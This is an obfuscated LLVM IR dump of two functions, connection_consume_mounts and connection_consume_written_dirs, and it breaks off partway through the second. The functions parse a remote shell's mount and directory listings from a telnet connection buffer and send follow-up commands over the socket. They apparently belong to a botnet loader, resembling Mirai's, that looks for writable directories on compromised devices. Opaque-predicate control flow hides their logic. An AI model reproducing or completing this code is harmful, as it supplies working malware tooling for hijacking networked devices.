define i32 @connection_consume_mounts(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca [256 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %11 = load %struct.connection*, %struct.connection** %3, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 15
  %13 = getelementptr inbounds [8192 x i8], [8192 x i8]* %12, i32 0, i32 0
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 9
  %16 = load i16, i16* %15, align 8
  %17 = zext i16 %16 to i32
  %18 = call i32 @util_memsearch(i8* %13, i32 %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %18, i32* %8, align 4
  %19 = load i32, i32* %8, align 4
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %38

; <label>:21:                                     ; preds = %1
  %22 = load i32, i32* @x.17
  %23 = load i32, i32* @y.18
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  store i32 0, i32* %2, align 4
  %30 = load i32, i32* @x.17
  %31 = load i32, i32* @y.18
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %323

; <label>:38:                                     ; preds = %1
  store i32 0, i32* %7, align 4
  br label %39

; <label>:39:                                     ; preds = %originalBBpart275, %38
  %40 = load i32, i32* %7, align 4
  %41 = load i32, i32* %8, align 4
  %42 = icmp slt i32 %40, %41
  br i1 %42, label %43, label %313

; <label>:43:                                     ; preds = %39
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = icmp eq i64 %45, 255
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* @x.17
  %49 = load i32, i32* @y.18
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = load i32, i32* @x.17
  %57 = load i32, i32* @y.18
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %313

; <label>:64:                                     ; preds = %43
  %65 = load %struct.connection*, %struct.connection** %3, align 8
  %66 = getelementptr inbounds %struct.connection, %struct.connection* %65, i32 0, i32 15
  %67 = load i32, i32* %7, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [8192 x i8], [8192 x i8]* %66, i64 0, i64 %68
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 10
  br i1 %72, label %73, label %173

; <label>:73:                                     ; preds = %64
  %74 = load i32, i32* %5, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %5, align 4
  %76 = sext i32 %74 to i64
  %77 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %76
  store i8 0, i8* %77, align 1
  %78 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i32 0, i32 0
  %79 = call i8* @strtok(i8* %78, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  %80 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  store i8* %80, i8** %9, align 8
  %81 = icmp eq i8* %80, null
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %73
  br label %172

; <label>:83:                                     ; preds = %73
  %84 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  %85 = icmp eq i8* %84, null
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %83
  br label %172

; <label>:87:                                     ; preds = %83
  %88 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i32 0, i32 0)) #5
  store i8* %88, i8** %10, align 8
  %89 = icmp eq i8* %88, null
  br i1 %89, label %90, label %91

; <label>:90:                                     ; preds = %87
  br label %172

; <label>:91:                                     ; preds = %87
  %92 = load i32, i32* @x.17
  %93 = load i32, i32* @y.18
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i8*, i8** %9, align 8
  %101 = load i8*, i8** %9, align 8
  %102 = call i64 @strlen(i8* %101) #6
  %103 = sub i64 %102, 1
  %104 = getelementptr inbounds i8, i8* %100, i64 %103
  %105 = load i8, i8* %104, align 1
  %106 = sext i8 %105 to i32
  %107 = icmp eq i32 %106, 47
  %108 = load i32, i32* @x.17
  %109 = load i32, i32* @y.18
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br i1 %107, label %116, label %138

; <label>:116:                                    ; preds = %originalBBpart215
  %117 = load i32, i32* @x.17
  %118 = load i32, i32* @y.18
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %116
  %125 = load i8*, i8** %9, align 8
  %126 = load i8*, i8** %9, align 8
  %127 = call i64 @strlen(i8* %126) #6
  %128 = sub i64 %127, 1
  %129 = getelementptr inbounds i8, i8* %125, i64 %128
  store i8 0, i8* %129, align 1
  %130 = load i32, i32* @x.17
  %131 = load i32, i32* @y.18
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart227, label %originalBB17alteredBB

originalBBpart227:                                ; preds = %originalBB17
  br label %138

; <label>:138:                                    ; preds = %originalBBpart227, %originalBBpart215
  %139 = load i32, i32* @x.17
  %140 = load i32, i32* @y.18
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %138
  %147 = load i8*, i8** %10, align 8
  %148 = load i8*, i8** %10, align 8
  %149 = call i64 @strlen(i8* %148) #6
  %150 = trunc i64 %149 to i32
  %151 = call i32 @util_memsearch(i8* %147, i32 %150, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i32 2)
  %152 = icmp ne i32 %151, -1
  %153 = load i32, i32* @x.17
  %154 = load i32, i32* @y.18
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %152, label %161, label %171

; <label>:161:                                    ; preds = %originalBBpart231
  %162 = load %struct.connection*, %struct.connection** %3, align 8
  %163 = getelementptr inbounds %struct.connection, %struct.connection* %162, i32 0, i32 4
  %164 = load i32, i32* %163, align 8
  %165 = load i8*, i8** %9, align 8
  %166 = load i8*, i8** %9, align 8
  %167 = load i8*, i8** %9, align 8
  %168 = load i8*, i8** %9, align 8
  %169 = load i8*, i8** %9, align 8
  %170 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %164, i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* %165, i8* %166, i8* %167, i8* %168, i8* %169)
  br label %171

; <label>:171:                                    ; preds = %161, %originalBBpart231
  br label %172

; <label>:172:                                    ; preds = %171, %90, %86, %82
  store i32 0, i32* %5, align 4
  br label %277

; <label>:173:                                    ; preds = %64
  %174 = load %struct.connection*, %struct.connection** %3, align 8
  %175 = getelementptr inbounds %struct.connection, %struct.connection* %174, i32 0, i32 15
  %176 = load i32, i32* %7, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds [8192 x i8], [8192 x i8]* %175, i64 0, i64 %177
  %179 = load i8, i8* %178, align 1
  %180 = zext i8 %179 to i32
  %181 = icmp eq i32 %180, 32
  br i1 %181, label %191, label %182

; <label>:182:                                    ; preds = %173
  %183 = load %struct.connection*, %struct.connection** %3, align 8
  %184 = getelementptr inbounds %struct.connection, %struct.connection* %183, i32 0, i32 15
  %185 = load i32, i32* %7, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds [8192 x i8], [8192 x i8]* %184, i64 0, i64 %186
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 9
  br i1 %190, label %191, label %223

; <label>:191:                                    ; preds = %182, %173
  %192 = load i32, i32* @x.17
  %193 = load i32, i32* @y.18
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %191
  %200 = load i32, i32* %6, align 4
  %201 = add nsw i32 %200, 1
  store i32 %201, i32* %6, align 4
  %202 = icmp eq i32 %200, 0
  %203 = load i32, i32* @x.17
  %204 = load i32, i32* @y.18
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBBpart246, label %originalBB33alteredBB

originalBBpart246:                                ; preds = %originalBB33
  br i1 %202, label %211, label %222

; <label>:211:                                    ; preds = %originalBBpart246
  %212 = load %struct.connection*, %struct.connection** %3, align 8
  %213 = getelementptr inbounds %struct.connection, %struct.connection* %212, i32 0, i32 15
  %214 = load i32, i32* %7, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds [8192 x i8], [8192 x i8]* %213, i64 0, i64 %215
  %217 = load i8, i8* %216, align 1
  %218 = load i32, i32* %5, align 4
  %219 = add nsw i32 %218, 1
  store i32 %219, i32* %5, align 4
  %220 = sext i32 %218 to i64
  %221 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %220
  store i8 %217, i8* %221, align 1
  br label %222

; <label>:222:                                    ; preds = %211, %originalBBpart246
  br label %276

; <label>:223:                                    ; preds = %182
  %224 = load %struct.connection*, %struct.connection** %3, align 8
  %225 = getelementptr inbounds %struct.connection, %struct.connection* %224, i32 0, i32 15
  %226 = load i32, i32* %7, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds [8192 x i8], [8192 x i8]* %225, i64 0, i64 %227
  %229 = load i8, i8* %228, align 1
  %230 = zext i8 %229 to i32
  %231 = icmp ne i32 %230, 13
  br i1 %231, label %232, label %259

; <label>:232:                                    ; preds = %223
  %233 = load i32, i32* @x.17
  %234 = load i32, i32* @y.18
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %232
  store i32 0, i32* %6, align 4
  %241 = load %struct.connection*, %struct.connection** %3, align 8
  %242 = getelementptr inbounds %struct.connection, %struct.connection* %241, i32 0, i32 15
  %243 = load i32, i32* %7, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds [8192 x i8], [8192 x i8]* %242, i64 0, i64 %244
  %246 = load i8, i8* %245, align 1
  %247 = load i32, i32* %5, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %5, align 4
  %249 = sext i32 %247 to i64
  %250 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %249
  store i8 %246, i8* %250, align 1
  %251 = load i32, i32* @x.17
  %252 = load i32, i32* @y.18
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBBpart259, label %originalBB48alteredBB

originalBBpart259:                                ; preds = %originalBB48
  br label %259

; <label>:259:                                    ; preds = %originalBBpart259, %223
  %260 = load i32, i32* @x.17
  %261 = load i32, i32* @y.18
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %259
  %268 = load i32, i32* @x.17
  %269 = load i32, i32* @y.18
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %276

; <label>:276:                                    ; preds = %originalBBpart263, %222
  br label %277

; <label>:277:                                    ; preds = %276, %172
  %278 = load i32, i32* @x.17
  %279 = load i32, i32* @y.18
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %277
  %286 = load i32, i32* @x.17
  %287 = load i32, i32* @y.18
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %294

; <label>:294:                                    ; preds = %originalBBpart267
  %295 = load i32, i32* @x.17
  %296 = load i32, i32* @y.18
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %294
  %303 = load i32, i32* %7, align 4
  %304 = add nsw i32 %303, 1
  store i32 %304, i32* %7, align 4
  %305 = load i32, i32* @x.17
  %306 = load i32, i32* @y.18
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart275, label %originalBB69alteredBB

originalBBpart275:                                ; preds = %originalBB69
  br label %39

; <label>:313:                                    ; preds = %originalBBpart24, %39
  %314 = load %struct.connection*, %struct.connection** %3, align 8
  %315 = getelementptr inbounds %struct.connection, %struct.connection* %314, i32 0, i32 4
  %316 = load i32, i32* %315, align 8
  %317 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %316, i8* getelementptr inbounds ([108 x i8], [108 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0))
  %318 = load %struct.connection*, %struct.connection** %3, align 8
  %319 = getelementptr inbounds %struct.connection, %struct.connection* %318, i32 0, i32 4
  %320 = load i32, i32* %319, align 8
  %321 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %320, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.17, i32 0, i32 0))
  %322 = load i32, i32* %8, align 4
  store i32 %322, i32* %2, align 4
  br label %323

; <label>:323:                                    ; preds = %313, %originalBBpart2
  %324 = load i32, i32* %2, align 4
  ret i32 %324

originalBBalteredBB:                              ; preds = %originalBB, %21
  store i32 0, i32* %2, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %325 = load i8*, i8** %9, align 8
  %326 = load i8*, i8** %9, align 8
  %327 = call i64 @strlen(i8* %326) #6
  %_ = shl i64 %327, 1
  %_7 = sub i64 %327, 1
  %gen = mul i64 %_7, 1
  %_8 = shl i64 %327, 1
  %_9 = shl i64 %327, 1
  %_10 = sub i64 %327, 1
  %gen11 = mul i64 %_10, 1
  %_12 = sub i64 0, %327
  %gen13 = add i64 %_12, 1
  %328 = sub i64 %327, 1
  %329 = getelementptr inbounds i8, i8* %325, i64 %328
  %330 = load i8, i8* %329, align 1
  %331 = sext i8 %330 to i32
  %332 = icmp eq i32 %331, 47
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %116
  %333 = load i8*, i8** %9, align 8
  %334 = load i8*, i8** %9, align 8
  %335 = call i64 @strlen(i8* %334) #6
  %_18 = shl i64 %335, 1
  %_19 = sub i64 %335, 1
  %gen20 = mul i64 %_19, 1
  %_21 = sub i64 0, %335
  %gen22 = add i64 %_21, 1
  %_23 = sub i64 %335, 1
  %gen24 = mul i64 %_23, 1
  %336 = sub i64 %335, 1
  %337 = getelementptr inbounds i8, i8* %333, i64 %336
  store i8 0, i8* %337, align 1
  br label %originalBB17

originalBB29alteredBB:                            ; preds = %originalBB29, %138
  %338 = load i8*, i8** %10, align 8
  %339 = load i8*, i8** %10, align 8
  %340 = call i64 @strlen(i8* %339) #6
  %341 = trunc i64 %340 to i32
  %342 = call i32 @util_memsearch(i8* %338, i32 %341, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.13, i32 0, i32 0), i32 2)
  %343 = icmp ne i32 %342, -1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %191
  %344 = load i32, i32* %6, align 4
  %_34 = sub i32 %344, 1
  %gen35 = mul i32 %_34, 1
  %_36 = sub i32 %344, 1
  %gen37 = mul i32 %_36, 1
  %_38 = sub i32 %344, 1
  %gen39 = mul i32 %_38, 1
  %_40 = shl i32 %344, 1
  %_41 = sub i32 0, %344
  %gen42 = add i32 %_41, 1
  %_43 = shl i32 %344, 1
  %_44 = shl i32 %344, 1
  %345 = add nsw i32 %344, 1
  store i32 %345, i32* %6, align 4
  %346 = icmp eq i32 %344, 0
  br label %originalBB33

originalBB48alteredBB:                            ; preds = %originalBB48, %232
  store i32 0, i32* %6, align 4
  %347 = load %struct.connection*, %struct.connection** %3, align 8
  %348 = getelementptr inbounds %struct.connection, %struct.connection* %347, i32 0, i32 15
  %349 = load i32, i32* %7, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds [8192 x i8], [8192 x i8]* %348, i64 0, i64 %350
  %352 = load i8, i8* %351, align 1
  %353 = load i32, i32* %5, align 4
  %_49 = shl i32 %353, 1
  %_50 = shl i32 %353, 1
  %_51 = sub i32 %353, 1
  %gen52 = mul i32 %_51, 1
  %_53 = shl i32 %353, 1
  %_54 = sub i32 0, %353
  %gen55 = add i32 %_54, 1
  %_56 = sub i32 %353, 1
  %gen57 = mul i32 %_56, 1
  %354 = add nsw i32 %353, 1
  store i32 %354, i32* %5, align 4
  %355 = sext i32 %353 to i64
  %356 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 %355
  store i8 %352, i8* %356, align 1
  br label %originalBB48

originalBB61alteredBB:                            ; preds = %originalBB61, %259
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %277
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %294
  %357 = load i32, i32* %7, align 4
  %_70 = sub i32 %357, 1
  %gen71 = mul i32 %_70, 1
  %_72 = sub i32 %357, 1
  %gen73 = mul i32 %_72, 1
  %358 = add nsw i32 %357, 1
  store i32 %358, i32* %7, align 4
  br label %originalBB69
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_written_dirs(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 0, i32* %7, align 4
  store i8 0, i8* %8, align 1
  %11 = load %struct.connection*, %struct.connection** %3, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 15
  %13 = getelementptr inbounds [8192 x i8], [8192 x i8]* %12, i32 0, i32 0
  %14 = load %struct.connection*, %struct.connection** %3, align 8
  %15 = getelementptr inbounds %struct.connection, %struct.connection* %14, i32 0, i32 9
  %16 = load i16, i16* %15, align 8
  %17 = zext i16 %16 to i32
  %18 = call i32 @util_memsearch(i8* %13, i32 %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %18, i32* %4, align 4
  %19 = icmp eq i32 %18, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %190

; <label>:21:                                     ; preds = %1
  br label %22

; <label>:22:                                     ; preds = %originalBBpart216, %49, %21
  %23 = load %struct.connection*, %struct.connection** %3, align 8
  %24 = getelementptr inbounds %struct.connection, %struct.connection* %23, i32 0, i32 15
  %25 = getelementptr inbounds [8192 x i8], [8192 x i8]* %24, i32 0, i32 0
  %26 = load i32, i32* %7, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %4, align 4
  %30 = load i32, i32* %7, align 4
  %31 = sub nsw i32 %29, %30
  %32 = call i32 @util_memsearch(i8* %28, i32 %31, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i32 0, i32 0), i32 4)
  store i32 %32, i32* %6, align 4
  %33 = load i32, i32* %6, align 4
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %22
  br label %172

; <label>:36:                                     ; preds = %22
  %37 = load i32, i32* %6, align 4
  %38 = load i32, i32* %7, align 4
  %39 = add nsw i32 %38, %37
  store i32 %39, i32* %7, align 4
  %40 = load %struct.connection*, %struct.connection** %3, align 8
  %41 = getelementptr inbounds %struct.connection, %struct.connection* %40, i32 0, i32 15
  %42 = getelementptr inbounds [8192 x i8], [8192 x i8]* %41, i32 0, i32 0
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = call i8* @strtok(i8* %45, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0)) #5
  store i8* %46, i8** %9, align 8
  %47 = load i8*, i8** %9, align 8
  %48 = icmp eq i8* %47, null
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %36
  br label %22

; <label>:50:                                     ; preds = %36
  %51 = load i8*, i8** %9, align 8
  %52 = call i64 @strlen(i8* %51) #6
  %53 = trunc i64 %52 to i32
  store i32 %53, i32* %10, align 4
  %54 = load i8*, i8** %9, align 8
  %55 = load i32, i32* %10, align 4
  %56 = sub nsw i32 %55, 1
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  br i1 %61, label %62, label %68

; <label>:62:                                     ; preds = %50
  %63 = load i8*, i8** %9, align 8
  %64 = load i32, i32* %10, align 4
  %65 = sub nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %63, i64 %66
  store i8 0, i8* %67, align 1
  br label %68

; <label>:68:                                     ; preds = %62, %50
  %69 = load %struct.connection*, %struct.connection** %3, align 8
  %70 = getelementptr inbounds %struct.connection, %struct.connection* %69, i32 0, i32 4
  %71 = load i32, i32* %70, align 8
  %72 = load i8*, i8** %9, align 8
  %73 = load i8*, i8** %9, align 8
  %74 = load i8*, i8** %9, align 8
  %75 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %71, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.20, i32 0, i32 0), i8* %72, i8* %73, i8* %74)
  %76 = load i8, i8* %8, align 1
  %77 = icmp ne i8 %76, 0
  br i1 %77, label %155, label %78

; <label>:78:                                     ; preds = %68
  %79 = load i32, i32* @x.19
  %80 = load i32, i32* @y.20
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %78
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 31
  %89 = load i32, i32* @x.19
  %90 = load i32, i32* @y.20
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %88, label %97, label %120

; <label>:97:                                     ; preds = %originalBBpart2
  %98 = load i32, i32* @x.19
  %99 = load i32, i32* @y.20
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %97
  %106 = load %struct.connection*, %struct.connection** %3, align 8
  %107 = getelementptr inbounds %struct.connection, %struct.connection* %106, i32 0, i32 3
  %108 = getelementptr inbounds %struct.telnet_info, %struct.telnet_info* %107, i32 0, i32 3
  %109 = getelementptr inbounds [32 x i8], [32 x i8]* %108, i32 0, i32 0
  %110 = load i8*, i8** %9, align 8
  %111 = call i8* @strcpy(i8* %109, i8* %110) #5
  store i8 1, i8* %8, align 1
  %112 = load i32, i32* @x.19
  %113 = load i32, i32* @y.20
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %138

; <label>:120:                                    ; preds = %originalBBpart2
  %121 = load i32, i32* @x.19
  %122 = load i32, i32* @y.20
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %120
  %129 = load %struct.connection*, %struct.connection** %3, align 8
  call void @connection_close(%struct.connection* %129)
  %130 = load i32, i32* @x.19
  %131 = load i32, i32* @y.20
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %138

; <label>:138:                                    ; preds = %originalBBpart28, %originalBBpart24
  %139 = load i32, i32* @x.19
  %140 = load i32, i32* @y.20
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB10, label %originalBB10alteredBB

